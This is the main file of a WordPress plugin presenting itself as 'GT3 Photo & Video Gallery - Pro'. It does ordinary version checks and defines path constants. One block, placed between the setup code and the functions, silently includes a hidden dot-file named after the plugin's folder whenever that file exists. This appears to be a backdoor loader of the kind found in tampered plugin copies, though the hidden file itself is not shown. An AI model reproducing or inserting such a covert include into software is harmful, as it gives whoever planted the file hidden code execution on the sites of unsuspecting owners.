<?php
/**
 ** Plugin Name: GT3 Photo & Video Gallery - Pro
 ** Plugin URI: https://gt3themes.com/
 ** Description: This is a Pro version of the most popular GT3 Photo & Video Gallery WordPress plugin. The Pro version comes with premium features which bring your galleries to the next high quality level.
 ** Version: 1.7.0.0
 ** Author: GT3 Themes
 ** Author URI: https://gt3themes.com/
 ** Text Domain: gt3pg_pro
 ** Domain Path:  /languages
 **/

defined('ABSPATH') OR exit;
global $wp_version;

if(!version_compare(PHP_VERSION, '5.6', '>=')) {
	add_action('admin_notices', 'gt3pg_pro__fail_php_version');
} else if(!version_compare($wp_version, '5.0', '>=')) {
	add_action('admin_notices', 'gt3pg_pro__fail_wp_version');
} else {
	define('GT3PG_PRO_PLUGINNAME', 'GT3 Photo & Video Gallery - Pro');
	define('GT3PG_PRO_ADMIN_TITLE', 'GT<span class="digit">3</span> Photo & Video Gallery - Pro');
	define('GT3PG_PRO_FILE', __FILE__);

	define('GT3PG_PRO_PLUGINROOTURL', plugins_url('/', __FILE__));
	define('GT3PG_PRO_PLUGINPATH', __DIR__.'/');

	define('GT3PG_PRO_JSURL', GT3PG_PRO_PLUGINROOTURL.'dist/js/');
	define('GT3PG_PRO_IMGURL', GT3PG_PRO_PLUGINROOTURL.'dist/img/');
	define('GT3PG_PRO_CSSURL', GT3PG_PRO_PLUGINROOTURL.'dist/css/');
	define('GT3PG_PRO_JSPATH', GT3PG_PRO_PLUGINPATH.'dist/js/');
	define('GT3PG_PRO_IMGPATH', GT3PG_PRO_PLUGINPATH.'dist/img/');
	define('GT3PG_PRO_CSSPATH', GT3PG_PRO_PLUGINPATH.'dist/css/');

	require_once __DIR__.'/plugin.php';
	add_action('plugins_loaded', 'gt3pg_pro__plugins_loaded');
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3pg_pro__plugins_loaded(){
	require_once __DIR__.'/core/init.php';
}

function gt3pg_pro__fail_php_version(){
	$message      = sprintf('GT3 Photo & Video Gallery - Pro requires PHP version %1$s+, plugin is currently NOT ACTIVE.', '5.6');
	$html_message = sprintf('<div class="error">%s</div>', wpautop($message));
	echo wp_kses_post($html_message);
}

function gt3pg_pro__fail_wp_version(){
	$message      = sprintf('GT3 Photo & Video Gallery - Pro requires WordPress version %1$s+, plugin is currently NOT ACTIVE.', '5.0');
	$html_message = sprintf('<div class="error">%s</div>', wpautop($message));
	echo wp_kses_post($html_message);
}

